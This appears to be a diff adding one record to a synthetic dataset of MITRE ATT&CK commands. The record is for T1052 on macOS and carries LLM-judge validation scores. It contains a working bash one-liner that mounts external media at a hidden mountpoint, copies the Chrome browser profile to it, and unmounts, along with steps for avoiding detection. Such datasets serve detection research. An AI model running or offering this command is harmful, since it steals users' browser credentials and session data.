@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo hdiutil attach -mountpoint /Volumes/.usb_stg -nobrowse /dev/disk2s1 && cp -pR ~/Library/Application\\ Support/Google/Chrome/Default /Volumes/.usb_stg/.chrome && hdiutil detach /Volumes/.usb_stg",
+  "explanation": "Mounts an external partition to a hidden mountpoint, copies browser profile data, then unmounts to stage it for removal.",
+  "rationale_steps": [
+    "Attach external media with a non-standard, hidden mount location.",
+    "Copy target data with preserved timestamps to reduce anomalies.",
+    "Detach to flush writes and minimize exposure window.",
+    "Activity remains fully local to the machine."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-bb61ba6f",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with proper chaining, valid flag syntax, and correct escaping with no quoting or separator errors.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly mounts a removable volume to a hidden mount point, copies Chrome data, and unmounts to stage exfiltration, though using hdiutil on a raw device and detaching by mountpoint (and the sudo/privilege mismatch) may be unreliable on macOS.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T07:44:52.833514Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly escaped spaces, balanced quotes, valid flags for hdiutil and cp, and correct use of && chaining and semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1052 by mounting an external disk partition to a hidden mountpoint (-nobrowse prevents Finder visibility), copying sensitive Chrome browser profile data with preserved attributes (-pR), and then detaching the volume — a realistic and operationally plausible exfiltration workflow on macOS.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:34:25.048180Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid macOS utilities (hdiutil, cp) with correct flags, proper path escaping for spaces, and valid logical separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements T1052 by mounting a physical disk partition to a hidden mountpoint, exfiltrating sensitive browser data, and cleaning up the mount state.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:34:31.360964Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
